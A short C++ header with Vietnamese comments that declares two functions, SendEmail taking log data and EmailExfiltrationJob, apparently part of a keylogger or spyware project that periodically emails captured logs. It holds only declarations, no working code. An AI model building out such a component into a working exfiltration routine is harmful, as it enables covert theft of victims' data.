#pragma once
#include "common.h"

// Gửi dữ liệu qua email
bool SendEmail(const std::string& logData);

// Thread gửi dữ liệu định kỳ
void EmailExfiltrationJob();